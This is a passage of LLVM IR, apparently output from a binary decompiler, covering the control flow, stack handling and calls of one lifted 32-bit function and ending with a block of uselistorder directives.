  %v2_804c195 = add i32 %v1_804c188, -12
  %v3_804c195 = inttoptr i32 %v2_804c195 to i32*
  store i32 %v1_804c18e, i32* %v3_804c195, align 4
  %v1_804c196 = inttoptr i32 %v1_804c183 to i32*
  %v2_804c196 = load i32, i32* %v1_804c196, align 4
  %v4_804c196 = add i32 %v1_804c188, -16
  %v5_804c196 = inttoptr i32 %v4_804c196 to i32*
  store i32 %v2_804c196, i32* %v5_804c196, align 4
  %v0_804c198 = call i32 @function_804ceec()
  store i32 %v0_804c198, i32* %eax.global-to-local, align 4
  %v0_804c19d = load i32, i32* @esp, align 4
  %v1_804c19d = add i32 %v0_804c19d, 16
  store i32 %v0_804c198, i32* @edi, align 4
  br label %dec_label_pc_804c13e

dec_label_pc_804c1a4:                             ; preds = %dec_label_pc_804c033, %dec_label_pc_804c02c, %dec_label_pc_804c019
  %v0_804c1be36 = phi i32 [ %v1_804bfbf, %dec_label_pc_804c033 ], [ 0, %dec_label_pc_804c02c ], [ 5, %dec_label_pc_804c019 ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804c1be

dec_label_pc_804c1a8:                             ; preds = %dec_label_pc_804c138, %dec_label_pc_804c0ab
  store i32 ptrtoint ([7 x i8]* @global_var_805302a.120 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_804c1b2

dec_label_pc_804c1b2:                             ; preds = %dec_label_pc_804c15b, %dec_label_pc_804c14b, %dec_label_pc_804c11b, %dec_label_pc_804c0ee, %dec_label_pc_804c1a8
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_804c1b9 = load i32, i32* @esp, align 4
  %v1_804c1b9 = add i32 %v0_804c1b9, 7
  %v2_804c1b9 = inttoptr i32 %v1_804c1b9 to i8*
  store i8 32, i8* %v2_804c1b9, align 1
  %v0_804c1be.pre = load i32, i32* @esi, align 4
  %v1_804c1be.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c1be

dec_label_pc_804c1be:                             ; preds = %dec_label_pc_804c1a4, %dec_label_pc_804c03b, %dec_label_pc_804c1b2
  %v1_804c1be = phi i32 [ 0, %dec_label_pc_804c1a4 ], [ %v2_804c033, %dec_label_pc_804c03b ], [ %v1_804c1be.pre, %dec_label_pc_804c1b2 ]
  %v0_804c1be = phi i32 [ %v0_804c1be36, %dec_label_pc_804c1a4 ], [ %v1_804bfbf, %dec_label_pc_804c03b ], [ %v0_804c1be.pre, %dec_label_pc_804c1b2 ]
  %v2_804c1be = add i32 %v0_804c1be, %v1_804c1be
  store i32 %v2_804c1be, i32* @edx, align 4
  %v0_804c1c1 = load i32, i32* @ebp, align 4
  %v9_804c1c1 = icmp eq i32 %v0_804c1c1, 11
  br i1 %v9_804c1c1, label %dec_label_pc_804c1d2, label %dec_label_pc_804c1c6

dec_label_pc_804c1c6:                             ; preds = %dec_label_pc_804c1be
  %v1_804c1c8 = add i32 %v0_804c1c1, -5
  %v6_804c1c8 = sub i32 4, %v0_804c1c1
  %v7_804c1c8 = and i32 %v6_804c1c8, %v0_804c1c1
  %v8_804c1c8 = icmp slt i32 %v7_804c1c8, 0
  %v9_804c1c8 = icmp eq i32 %v1_804c1c8, 0
  %v10_804c1c8 = icmp slt i32 %v1_804c1c8, 0
  %v3_804c1cb = icmp eq i1 %v10_804c1c8, %v8_804c1c8
  %v4_804c1cb = icmp eq i1 %v9_804c1c8, false
  %v5_804c1cb = and i1 %v4_804c1cb, %v3_804c1cb
  %v6_804c1cb = zext i1 %v5_804c1cb to i32
  store i32 %v6_804c1cb, i32* %eax.global-to-local, align 4
  %v2_804c1ce = add i32 %v2_804c1be, 1
  %v3_804c1ce = add i32 %v2_804c1ce, %v6_804c1cb
  store i32 %v3_804c1ce, i32* @edx, align 4
  br label %dec_label_pc_804c1d2

dec_label_pc_804c1d2:                             ; preds = %dec_label_pc_804c1be, %dec_label_pc_804c1c6
  %v0_804c1d2 = load i32, i32* @esp, align 4
  %v1_804c1d2 = add i32 %v0_804c1d2, 24
  %v2_804c1d2 = inttoptr i32 %v1_804c1d2 to i32*
  %v3_804c1d2 = load i32, i32* %v2_804c1d2, align 4
  store i32 %v3_804c1d2, i32* %eax.global-to-local, align 4
  %v1_804c1d6 = add i32 %v0_804c1d2, 8
  %v2_804c1d6 = inttoptr i32 %v1_804c1d6 to i32*
  store i32 0, i32* %v2_804c1d6, align 4
  %v0_804c1de = load i32, i32* %eax.global-to-local, align 4
  %v1_804c1de = load i32, i32* @edx, align 4
  %v2_804c1de = sub i32 %v0_804c1de, %v1_804c1de
  %v7_804c1de = icmp ult i32 %v0_804c1de, %v1_804c1de
  %v12_804c1de = icmp eq i32 %v2_804c1de, 0
  %v2_804c1e0 = or i1 %v7_804c1de, %v12_804c1de
  br i1 %v2_804c1e0, label %dec_label_pc_804c1e8, label %dec_label_pc_804c1e2

dec_label_pc_804c1e2:                             ; preds = %dec_label_pc_804c1d2
  store i32 %v2_804c1de, i32* %eax.global-to-local, align 4
  %v1_804c1e4 = load i32, i32* @esp, align 4
  %v2_804c1e4 = add i32 %v1_804c1e4, 8
  %v3_804c1e4 = inttoptr i32 %v2_804c1e4 to i32*
  store i32 %v2_804c1de, i32* %v3_804c1e4, align 4
  %v0_804c1ec.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804c1e8

dec_label_pc_804c1e8:                             ; preds = %dec_label_pc_804c1d2, %dec_label_pc_804c1e2
  %v0_804c1ec = phi i32 [ %v1_804c1de, %dec_label_pc_804c1d2 ], [ %v0_804c1ec.pre, %dec_label_pc_804c1e2 ]
  %v0_804c1e8 = load i32, i32* @esp, align 4
  %v1_804c1e8 = add i32 %v0_804c1e8, 8
  %v2_804c1e8 = inttoptr i32 %v1_804c1e8 to i32*
  %v3_804c1e8 = load i32, i32* %v2_804c1e8, align 4
  store i32 %v3_804c1e8, i32* %ecx.global-to-local, align 4
  %v2_804c1ec = add i32 %v3_804c1e8, %v0_804c1ec
  store i32 %v2_804c1ec, i32* %eax.global-to-local, align 4
  %v1_804c1ef = inttoptr i32 %v0_804c1e8 to i32*
  %v2_804c1ef = load i32, i32* %v1_804c1ef, align 4
  %v4_804c1ef = add i32 %v2_804c1ef, %v2_804c1ec
  store i32 %v4_804c1ef, i32* %v1_804c1ef, align 4
  %v0_804c1f2 = load i32, i32* @esp, align 4
  %v1_804c1f2 = add i32 %v0_804c1f2, 7
  %v2_804c1f2 = inttoptr i32 %v1_804c1f2 to i8*
  %v3_804c1f2 = load i8, i8* %v2_804c1f2, align 1
  %v9_804c1f2 = icmp eq i8 %v3_804c1f2, 48
  %v1_804c1f7 = icmp eq i1 %v9_804c1f2, false
  br i1 %v1_804c1f7, label %dec_label_pc_804c203, label %dec_label_pc_804c1f9

dec_label_pc_804c1f9:                             ; preds = %dec_label_pc_804c1e8
  %v0_804c1f9 = load i32, i32* @ebx, align 4
  %v1_804c1f9 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c1f9 = add i32 %v1_804c1f9, %v0_804c1f9
  store i32 %v2_804c1f9, i32* @ebx, align 4
  %v1_804c1fb = add i32 %v0_804c1f2, 8
  %v2_804c1fb = inttoptr i32 %v1_804c1fb to i32*
  store i32 0, i32* %v2_804c1fb, align 4
  %v0_804c203.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c203

dec_label_pc_804c203:                             ; preds = %dec_label_pc_804c1e8, %dec_label_pc_804c1f9
  %v0_804c20a = phi i32 [ %v0_804c1f2, %dec_label_pc_804c1e8 ], [ %v0_804c203.pre, %dec_label_pc_804c1f9 ]
  %v1_804c203 = add i32 %v0_804c20a, 32
  %v2_804c203 = inttoptr i32 %v1_804c203 to i8*
  %v3_804c203 = load i8, i8* %v2_804c203, align 1
  %v4_804c203 = and i8 %v3_804c203, 8
  %v5_804c203 = icmp eq i8 %v4_804c203, 0
  %v1_804c208 = icmp eq i1 %v5_804c203, false
  br i1 %v1_804c208, label %dec_label_pc_804c231, label %dec_label_pc_804c20a

dec_label_pc_804c20a:                             ; preds = %dec_label_pc_804c203
  %v1_804c20a = add i32 %v0_804c20a, 8
  %v2_804c20a = inttoptr i32 %v1_804c20a to i32*
  %v3_804c20a = load i32, i32* %v2_804c20a, align 4
  store i32 %v3_804c20a, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804c213 = add i32 %v0_804c20a, 368
  %v2_804c213 = inttoptr i32 %v1_804c213 to i32*
  %v3_804c213 = load i32, i32* %v2_804c213, align 4
  store i32 %v3_804c213, i32* @eax, align 4
  %v0_804c21a = call i32 @function_804bcec()
  store i32 %v0_804c21a, i32* %eax.global-to-local, align 4
  %v1_804c21f = load i32, i32* @esp, align 4
  %v2_804c21f = add i32 %v1_804c21f, 8
  %v3_804c21f = inttoptr i32 %v2_804c21f to i32*
  %v4_804c21f = load i32, i32* %v3_804c21f, align 4
  %v15_804c21f = icmp eq i32 %v0_804c21a, %v4_804c21f
  %v1_804c223 = icmp eq i1 %v15_804c21f, false
  br i1 %v1_804c223, label %dec_label_pc_804c31f, label %dec_label_pc_804c229

dec_label_pc_804c229:                             ; preds = %dec_label_pc_804c20a
  store i32 0, i32* %v3_804c21f, align 4
  %v1_804c231.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c231

dec_label_pc_804c231:                             ; preds = %dec_label_pc_804c203, %dec_label_pc_804c229
  %v1_804c231 = phi i32 [ %v0_804c20a, %dec_label_pc_804c203 ], [ %v1_804c231.pre, %dec_label_pc_804c229 ]
  %v0_804c231 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c231 = add i32 %v1_804c231, -4
  %v3_804c231 = inttoptr i32 %v2_804c231 to i32*
  store i32 %v0_804c231, i32* %v3_804c231, align 4
  %v0_804c232 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c232 = add i32 %v1_804c231, -8
  %v3_804c232 = inttoptr i32 %v2_804c232 to i32*
  store i32 %v0_804c232, i32* %v3_804c232, align 4
  %v1_804c233 = add i32 %v1_804c231, 368
  %v2_804c233 = inttoptr i32 %v1_804c233 to i32*
  %v3_804c233 = load i32, i32* %v2_804c233, align 4
  %v5_804c233 = add i32 %v1_804c231, -12
  %v6_804c233 = inttoptr i32 %v5_804c233 to i32*
  store i32 %v3_804c233, i32* %v6_804c233, align 4
  %v0_804c23a = load i32, i32* @ebp, align 4
  %v1_804c23a = add i32 %v0_804c23a, ptrtoint (i32* @global_var_8053031.121 to i32)
  store i32 %v1_804c23a, i32* %eax.global-to-local, align 4
  %v2_804c240 = add i32 %v1_804c231, -16
  %v3_804c240 = inttoptr i32 %v2_804c240 to i32*
  store i32 %v1_804c23a, i32* %v3_804c240, align 4
  %v0_804c241 = call i32 @function_804cd90()
  store i32 %v0_804c241, i32* %eax.global-to-local, align 4
  %v0_804c246 = load i32, i32* @esp, align 4
  %v1_804c246 = add i32 %v0_804c246, 384
  %v2_804c246 = inttoptr i32 %v1_804c246 to i32*
  %v3_804c246 = load i32, i32* %v2_804c246, align 4
  store i32 %v3_804c246, i32* @eax, align 4
  %v0_804c24d = load i32, i32* @ebx, align 4
  store i32 %v0_804c24d, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804c254 = call i32 @function_804bcec()
  store i32 %v0_804c254, i32* %eax.global-to-local, align 4
  %v0_804c259 = load i32, i32* @esp, align 4
  %v1_804c259 = add i32 %v0_804c259, 16
  %v1_804c25c = load i32, i32* @ebx, align 4
  %v12_804c25c = icmp eq i32 %v0_804c254, %v1_804c25c
  %v1_804c25e = icmp eq i1 %v12_804c25c, false
  br i1 %v1_804c25e, label %dec_label_pc_804c31f, label %dec_label_pc_804c264

dec_label_pc_804c264:                             ; preds = %dec_label_pc_804c231
  %v1_804c264 = add i32 %v0_804c259, 356
  %v2_804c264 = inttoptr i32 %v1_804c264 to i32*
  %v3_804c264 = load i32, i32* %v2_804c264, align 4
  %v4_804c264 = icmp eq i32 %v3_804c264, 0
  %v1_804c26c = icmp eq i1 %v4_804c264, false
  br i1 %v1_804c26c, label %dec_label_pc_804c290, label %dec_label_pc_804c26e

dec_label_pc_804c26e:                             ; preds = %dec_label_pc_804c264
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804c270 = load i32, i32* @esi, align 4
  %v1_804c270 = icmp eq i32 %v0_804c270, 0
  br i1 %v1_804c270, label %dec_label_pc_804c286.thread, label %dec_label_pc_804c286

dec_label_pc_804c286.thread:                      ; preds = %dec_label_pc_804c26e
  br label %dec_label_pc_804c2f1

dec_label_pc_804c286:                             ; preds = %dec_label_pc_804c26e
  %v2_804c274 = add i32 %v0_804c259, 12
  %v3_804c274 = inttoptr i32 %v2_804c274 to i32*
  store i32 0, i32* %v3_804c274, align 4
  %v1_804c275 = add i32 %v0_804c259, 384
  %v2_804c275 = inttoptr i32 %v1_804c275 to i32*
  %v3_804c275 = load i32, i32* %v2_804c275, align 4
  %v5_804c275 = add i32 %v0_804c259, 8
  %v6_804c275 = inttoptr i32 %v5_804c275 to i32*
  store i32 %v3_804c275, i32* %v6_804c275, align 4
  %v0_804c27c = load i32, i32* @esi, align 4
  %v2_804c27c = add i32 %v0_804c259, 4
  %v3_804c27c = inttoptr i32 %v2_804c27c to i32*
  store i32 %v0_804c27c, i32* %v3_804c27c, align 4
  %v0_804c27d = load i32, i32* @edi, align 4
  %v3_804c27d = inttoptr i32 %v0_804c259 to i32*
  store i32 %v0_804c27d, i32* %v3_804c27d, align 4
  %v0_804c27e = load i32, i32* %stack_var_-364, align 4
  %v4_804c27e = call i32 @function_804f620(i32 %v0_804c27e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c27e, i32* %eax.global-to-local, align 4
  %v0_804c283 = load i32, i32* @esp, align 4
  %v1_804c283 = add i32 %v0_804c283, 16
  %v1_804c286.pre = load i32, i32* @esi, align 4
  %v12_804c286 = icmp eq i32 %v4_804c27e, %v1_804c286.pre
  %v1_804c288 = icmp eq i1 %v12_804c286, false
  br i1 %v1_804c288, label %dec_label_pc_804c31f, label %dec_label_pc_804c2f1

dec_label_pc_804c290:                             ; preds = %dec_label_pc_804c264
  %v1_804c290 = add i32 %v0_804c259, 348
  %v2_804c290 = inttoptr i32 %v1_804c290 to i32*
  store i32 0, i32* %v2_804c290, align 4
  %v0_804c2ed7 = load i32, i32* @esi, align 4
  %v1_804c2ed8 = icmp eq i32 %v0_804c2ed7, 0
  %v1_804c2ef15 = icmp eq i1 %v1_804c2ed8, false
  br i1 %v1_804c2ef15, label %dec_label_pc_804c29d, label %dec_label_pc_804c290.dec_label_pc_804c2f1.loopexit_crit_edge

dec_label_pc_804c290.dec_label_pc_804c2f1.loopexit_crit_edge: ; preds = %dec_label_pc_804c290
  %v0_804c2f1.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c2f1

dec_label_pc_804c29d:                             ; preds = %dec_label_pc_804c290, %dec_label_pc_804c2eb
  %v0_804c29d = phi i32 [ %v2_804c2eb, %dec_label_pc_804c2eb ], [ %v0_804c2ed7, %dec_label_pc_804c290 ]
  %tmp101 = icmp ult i32 %v0_804c29d, 129
  br i1 %tmp101, label %dec_label_pc_804c2ac, label %dec_label_pc_804c2a7

dec_label_pc_804c2a7:                             ; preds = %dec_label_pc_804c29d
  br label %dec_label_pc_804c2ac

dec_label_pc_804c2ac:                             ; preds = %dec_label_pc_804c29d, %dec_label_pc_804c2a7
  %storemerge102 = phi i32 [ 128, %dec_label_pc_804c2a7 ], [ %v0_804c29d, %dec_label_pc_804c29d ]
  store i32 %storemerge102, i32* %edx.global-to-local, align 4
  %v0_804c2ac = load i32, i32* @esp, align 4
  %v1_804c2ac = add i32 %v0_804c2ac, 332
  %v2_804c2b3 = add i32 %v0_804c2ac, -4
  %v3_804c2b3 = inttoptr i32 %v2_804c2b3 to i32*
  store i32 %v1_804c2ac, i32* %v3_804c2b3, align 4
  %v0_804c2b4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c2b4 = add i32 %v0_804c2ac, -8
  %v3_804c2b4 = inttoptr i32 %v2_804c2b4 to i32*
  store i32 %v0_804c2b4, i32* %v3_804c2b4, align 4
  %v1_804c2b5 = add i32 %v0_804c2ac, 340
  store i32 %v1_804c2b5, i32* %eax.global-to-local, align 4
  %v2_804c2bc = add i32 %v0_804c2ac, -12
  %v3_804c2bc = inttoptr i32 %v2_804c2bc to i32*
  store i32 %v1_804c2b5, i32* %v3_804c2bc, align 4
  %v1_804c2bd = add i32 %v0_804c2ac, 204
  store i32 %v1_804c2bd, i32* @edi, align 4
  %v2_804c2c4 = add i32 %v0_804c2ac, -16
  %v3_804c2c4 = inttoptr i32 %v2_804c2c4 to i32*
  store i32 %v1_804c2bd, i32* %v3_804c2c4, align 4
  %v0_804c2c5 = call i32 @function_804f4c4()
  store i32 %v0_804c2c5, i32* @ebx, align 4
  %v0_804c2cc = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804c2d1 = icmp eq i32 %v0_804c2c5, 0
  br i1 %v1_804c2d1, label %dec_label_pc_804c2e7, label %dec_label_pc_804c2d5

dec_label_pc_804c2d5:                             ; preds = %dec_label_pc_804c2ac
  %v0_804c2d5 = load i32, i32* @ebp, align 4
  %v2_804c2d5 = add i32 %v0_804c2cc, 12
  %v3_804c2d5 = inttoptr i32 %v2_804c2d5 to i32*
  store i32 %v0_804c2d5, i32* %v3_804c2d5, align 4
  %v1_804c2d6 = add i32 %v0_804c2cc, 384
  %v2_804c2d6 = inttoptr i32 %v1_804c2d6 to i32*
  %v3_804c2d6 = load i32, i32* %v2_804c2d6, align 4
  %v5_804c2d6 = add i32 %v0_804c2cc, 8
  %v6_804c2d6 = inttoptr i32 %v5_804c2d6 to i32*
  store i32 %v3_804c2d6, i32* %v6_804c2d6, align 4
  %v2_804c2dd = add i32 %v0_804c2cc, 4
  %v3_804c2dd = inttoptr i32 %v2_804c2dd to i32*
  store i32 %v0_804c2c5, i32* %v3_804c2dd, align 4
  %v0_804c2de = load i32, i32* @edi, align 4
  %v3_804c2de = inttoptr i32 %v0_804c2cc to i32*
  store i32 %v0_804c2de, i32* %v3_804c2de, align 4
  %v0_804c2df = load i32, i32* %stack_var_-364, align 4
  %v4_804c2df = call i32 @function_804f620(i32 %v0_804c2df, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c2df, i32* %eax.global-to-local, align 4
  %v0_804c2e4 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c2e7

dec_label_pc_804c2e7:                             ; preds = %dec_label_pc_804c2ac, %dec_label_pc_804c2d5
  %v0_804c31f49.in = phi i32 [ %v0_804c2cc, %dec_label_pc_804c2ac ], [ %v0_804c2e4, %dec_label_pc_804c2d5 ]
  %v1_804c2eb = phi i32 [ 0, %dec_label_pc_804c2ac ], [ %v4_804c2df, %dec_label_pc_804c2d5 ]
  %v0_804c31f49 = add i32 %v0_804c31f49.in, 16
  %v12_804c2e7 = icmp eq i32 %v1_804c2eb, %v0_804c2c5
  %v1_804c2e9 = icmp eq i1 %v12_804c2e7, false
  br i1 %v1_804c2e9, label %dec_label_pc_804c31f, label %dec_label_pc_804c2eb

dec_label_pc_804c2eb:                             ; preds = %dec_label_pc_804c2e7
  %v0_804c2eb = load i32, i32* @esi, align 4
  %v2_804c2eb = sub i32 %v0_804c2eb, %v1_804c2eb
  %v12_804c2eb = icmp eq i32 %v2_804c2eb, 0
  store i32 %v2_804c2eb, i32* @esi, align 4
  %v1_804c2ef = icmp eq i1 %v12_804c2eb, false
  br i1 %v1_804c2ef, label %dec_label_pc_804c29d, label %dec_label_pc_804c2f1

dec_label_pc_804c2f1:                             ; preds = %dec_label_pc_804c2eb, %dec_label_pc_804c286.thread, %dec_label_pc_804c290.dec_label_pc_804c2f1.loopexit_crit_edge, %dec_label_pc_804c286
  %v0_804c2f1 = phi i32 [ %v1_804c283, %dec_label_pc_804c286 ], [ %v0_804c2f1.pre.pre, %dec_label_pc_804c290.dec_label_pc_804c2f1.loopexit_crit_edge ], [ %v1_804c259, %dec_label_pc_804c286.thread ], [ %v0_804c31f49, %dec_label_pc_804c2eb ]
  %v1_804c2f1 = add i32 %v0_804c2f1, 8
  %v2_804c2f1 = inttoptr i32 %v1_804c2f1 to i32*
  %v3_804c2f1 = load i32, i32* %v2_804c2f1, align 4
  store i32 %v3_804c2f1, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804c2fa = add i32 %v0_804c2f1, 368
  %v2_804c2fa = inttoptr i32 %v1_804c2fa to i32*
  %v3_804c2fa = load i32, i32* %v2_804c2fa, align 4
  store i32 %v3_804c2fa, i32* @eax, align 4
  %v0_804c301 = call i32 @function_804bcec()
  store i32 %v0_804c301, i32* %eax.global-to-local, align 4
  %v1_804c306 = load i32, i32* @esp, align 4
  %v2_804c306 = add i32 %v1_804c306, 8
  %v3_804c306 = inttoptr i32 %v2_804c306 to i32*
  %v4_804c306 = load i32, i32* %v3_804c306, align 4
  %v15_804c306 = icmp eq i32 %v0_804c301, %v4_804c306
  %v1_804c30a = icmp eq i1 %v15_804c306, false
  br i1 %v1_804c30a, label %dec_label_pc_804c31f, label %dec_label_pc_804c30c

dec_label_pc_804c30c:                             ; preds = %dec_label_pc_804c2f1, %dec_label_pc_804beb4, %dec_label_pc_804c086
  %v0_804c30c = phi i32 [ %v1_804c306, %dec_label_pc_804c2f1 ], [ %v1_804bed2, %dec_label_pc_804beb4 ], [ %v0_804c30c.pre, %dec_label_pc_804c086 ]
  %v1_804c30c = add i32 %v0_804c30c, 16
  %v2_804c30c = inttoptr i32 %v1_804c30c to i32*
  %v3_804c30c = load i32, i32* %v2_804c30c, align 4
  store i32 %v3_804c30c, i32* @ebx, align 4
  store i32 %v3_804c30c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804be0c.backedge

dec_label_pc_804c317:                             ; preds = %dec_label_pc_804be4a
  %v1_804c317 = add i32 %v0_804c317, 2
  store i32 %v1_804c317, i32* @ebx, align 4
  br label %dec_label_pc_804be0c.backedge

dec_label_pc_804c31f:                             ; preds = %dec_label_pc_804be36, %dec_label_pc_804c2f1, %dec_label_pc_804c286, %dec_label_pc_804c231, %dec_label_pc_804c20a, %dec_label_pc_804c17a, %dec_label_pc_804c0f5, %dec_label_pc_804c0c9, %dec_label_pc_804c05d, %dec_label_pc_804c2e7
  %v0_804c31f = phi i32 [ %v0_804c31f49, %dec_label_pc_804c2e7 ], [ %v0_804c31f.pre.pre, %dec_label_pc_804be36 ], [ %v1_804c306, %dec_label_pc_804c2f1 ], [ %v1_804c283, %dec_label_pc_804c286 ], [ %v1_804c259, %dec_label_pc_804c231 ], [ %v1_804c21f, %dec_label_pc_804c20a ], [ %v0_804beac.lcssa, %dec_label_pc_804c17a ], [ %v1_804c10d, %dec_label_pc_804c0f5 ], [ %v1_804c0e0, %dec_label_pc_804c0c9 ], [ %v1_804c07b, %dec_label_pc_804c05d ]
  %v1_804c31f = inttoptr i32 %v0_804c31f to i32*
  store i32 -1, i32* %v1_804c31f, align 4
  br label %dec_label_pc_804c326

dec_label_pc_804c326:                             ; preds = %dec_label_pc_804be41, %dec_label_pc_804bdaf, %dec_label_pc_804bdce, %dec_label_pc_804c31f
  %v0_804c326 = load i32, i32* @esp, align 4
  %v1_804c326 = inttoptr i32 %v0_804c326 to i32*
  %v2_804c326 = load i32, i32* %v1_804c326, align 4
  store i32 %v2_804c326, i32* %eax.global-to-local, align 4
  %v1_804c329 = add i32 %v0_804c326, 348
  %v1_804c32f = inttoptr i32 %v1_804c329 to i32*
  %v2_804c32f = load i32, i32* %v1_804c32f, align 4
  store i32 %v2_804c32f, i32* @ebx, align 4
  ret i32 %v2_804c326

; uselistorder directives
  uselistorder i32 %v1_804c317, { 1, 0 }
  uselistorder i32 %v3_804c30c, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804c2f1, { 1, 0 }
  uselistorder i32 %v2_804c2eb, { 1, 2, 0 }
  uselistorder i32 %v0_804c31f49, { 1, 0 }
  uselistorder i32 %v1_804c2eb, { 1, 0 }
  uselistorder i32 %v0_804c2cc, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_804c259, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804c231, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804c20a, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804c1de, { 1, 0, 2 }
  uselistorder i32 %v6_804c1cb, { 1, 0 }
  uselistorder i32 %v1_804c1c8, { 1, 0 }
  uselistorder i32 %v0_804c1c1, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804c14b, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_804c15b, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804c0bc, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_804c0a2, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_804c03b, { 1, 0, 2 }
  uselistorder i32 %v1_804bfbf, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_804c012, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_804bf9b, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804bf54, { 1, 0 }
  uselistorder i32 %v1_804bf61, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_804beac, { 3, 11, 13, 5, 4, 7, 6, 8, 12, 0, 1, 2, 10, 9, 14, 15 }
  uselistorder i32 %v0_804beac.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804bea8, { 1, 0 }
  uselistorder i32 %v1_804bea8.pre, { 1, 0 }
  uselistorder i32 %v1_804bea7, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_804bea4, { 1, 0 }
  uselistorder i32 %v2_804bea879, { 1, 0 }
  uselistorder i32 %v3_804be8e, { 1, 0 }
  uselistorder i32 %v1_804be4a, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804be16, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804be1a, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804be04, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 6, 5, 2, 3, 1, 0, 4, 7, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 21, 16, 22, 1, 23, 27, 24, 25, 26, 28, 29, 30, 31, 5, 4, 7, 6, 8, 9, 14, 10, 11, 12, 15, 13, 17, 18, 19, 20 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 8, 0, 3, 4, 5, 6, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 55, 56, 57, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 54, 38, 39, 40, 41 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @function_804bcec, { 2, 1, 0, 3 }
  uselistorder i32 ()* @function_804f4c4, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 2, 0, 3, 1, 4 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804c326, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804c31f, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804c30c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c2f1, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804c2e7, { 1, 0 }
  uselistorder label %dec_label_pc_804c2ac, { 1, 0 }
  uselistorder label %dec_label_pc_804c29d, { 1, 0 }
  uselistorder label %dec_label_pc_804c231, { 1, 0 }
  uselistorder label %dec_label_pc_804c203, { 1, 0 }
  uselistorder label %dec_label_pc_804c1e8, { 1, 0 }
  uselistorder label %dec_label_pc_804c1d2, { 1, 0 }
  uselistorder label %dec_label_pc_804c1be, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c1b2, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804c14b, { 1, 0 }
  uselistorder label %dec_label_pc_804c13e, { 1, 0 }
  uselistorder label %dec_label_pc_804c0c9, { 1, 0 }
  uselistorder label %dec_label_pc_804c05d, { 1, 0 }
  uselistorder label %dec_label_pc_804c012, { 1, 0 }
  uselistorder label %dec_label_pc_804c003, { 6, 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_804bfc9, { 1, 0 }
  uselistorder label %dec_label_pc_804bfb0, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804bf61, { 1, 0 }
  uselistorder label %dec_label_pc_804bf48, { 1, 0 }
  uselistorder label %dec_label_pc_804bf34, { 1, 0 }
  uselistorder label %dec_label_pc_804bf2f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804bf10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804be9d, { 1, 0 }
  uselistorder label %dec_label_pc_804be95, { 1, 0 }
  uselistorder label %dec_label_pc_804be41, { 1, 0 }
  uselistorder label %dec_label_pc_804be36, { 1, 0 }
  uselistorder label %dec_label_pc_804be0c.backedge, { 2, 1, 0 }
}

